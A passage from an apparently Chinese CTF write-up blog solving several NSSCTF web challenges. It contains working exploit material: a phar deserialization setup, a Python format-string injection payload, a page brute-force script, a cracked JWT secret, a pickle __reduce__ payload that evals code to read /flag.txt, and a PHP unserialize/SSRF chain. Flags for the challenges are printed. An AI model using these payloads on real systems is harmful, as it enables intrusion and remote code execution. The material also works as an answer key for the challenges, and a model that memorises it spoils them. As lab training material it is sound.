class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下为delete.php，删除文件时触发unlink，也会触发phar反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;c75690ab-7f71-4249-9591-3604d9b33f33&#125;</span><br></pre></td></tr></table></figure><h2 id="MoeCTF-2021-地狱通讯"><a href="#MoeCTF-2021-地狱通讯" class="headerlink" title="[MoeCTF 2021]地狱通讯"></a>[MoeCTF 2021]地狱通讯</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162221344.png" alt="image-20241217162221344"></p><p>整理得到如下源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, FLAG </span><br><span class="line"><span class="keyword">import</span> datetime </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) </span><br><span class="line">ctx = f.read() </span><br><span class="line">f.close() </span><br><span class="line"></span><br><span class="line">f1ag = request.args.get(<span class="string">&#x27;f1ag&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">exp = request.args.get(<span class="string">&#x27;exp&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">flAg = FLAG(f1ag) </span><br><span class="line">message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + exp </span><br><span class="line"><span class="keyword">if</span> exp == <span class="string">&quot;&quot;</span>: </span><br><span class="line"><span class="keyword">return</span> ctx </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> message.<span class="built_in">format</span>(flAg) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: app.run() </span><br></pre></td></tr></table></figure><p>关键的利用点在message.format(flAg)和message &#x3D; “Your flag is {0}” + exp </p><p>考点不出意外就是format函数</p><p>这其实可以看做是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Your flag is flAg&quot; + exp </span><br></pre></td></tr></table></figure><p>，后面还有个exp可控，我们让他也为{}，那么这个内容就可控了</p><p><img src="http://49.232.222.195/usr/uploads/2024/01/3143471657.png" alt="2024-01-24T10:25:56.png"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162431715.png" alt="image-20241217162431715"></p><p>那么我们让exp为如下试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;0.__class__&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162525349.png" alt="image-20241217162525349"></p><p>成功，接下来看globals即可。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162550738.png" alt="image-20241217162550738" style="zoom: 67%;" /><h2 id="CISCN-2019华北Day1-Web2"><a href="#CISCN-2019华北Day1-Web2" class="headerlink" title="[CISCN 2019华北Day1]Web2"></a>[CISCN 2019华北Day1]Web2</h2><p>注册一个账号然后登陆进入就行。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183017666.png" alt="image-20241217183017666"></p><p>ikun们冲呀，一定要买到lv6</p><p>ok，下面找lv6就行，但是翻了好多页都没有，可能数字很大，我们爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28454/shop?page=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    target=url+<span class="built_in">str</span>(i)</span><br><span class="line">    res=requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>180，ok拿捏</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183108043.png" alt="image-20241217183108043" style="zoom:67%;" /><p>天价，那么接下来可能考点就是支付逻辑漏洞</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183711068.png" alt="image-20241217183711068"></p><p>这里需要admin用户才行，同时给了jwt，那么我们伪造jwt就行，这里我试了很多方法都不行，后来jwtcrack一下直接爆破出了密钥</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217184946236.png" alt="image-20241217184946236"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1Kun</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217185044193.png" alt="image-20241217185044193"></p><p>在源代码看到<a href="http://www.zip/">www.zip</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = <span class="variable language_">self</span>.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在admin.py处发现pickle.loads，存在pickle反序列化</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217191850648.png" alt="image-20241217191850648" style="zoom:67%;" /><p>同时看一下对于路由的配置，对应的是&#x2F;b1g_m4mber路由，那么我们只需要在这个路由下进行pickle反序列化即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = cmd()</span><br><span class="line">c = pickle.dumps(c)</span><br><span class="line">d=urllib.quote(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>这里当时试了好久，后来才知道urllib.unquote对应python2版本，要用python2来，不能用python3，同时cmd类中要继承object才行！！！</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217194810760.png" alt="image-20241217194810760" style="zoom: 67%;" /><h2 id="SWPUCTF-2022-新生赛-Power"><a href="#SWPUCTF-2022-新生赛-Power" class="headerlink" title="[SWPUCTF 2022 新生赛]Power!"></a>[SWPUCTF 2022 新生赛]Power!</h2><p>主要是关于php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Image Viewer ~ @V@&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;This is a Image viewer&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;/&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;vergil.jpg&quot;</span> name=<span class="string">&quot;image_path&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;submit&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;hacker.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- ?source= --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1:65500/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, 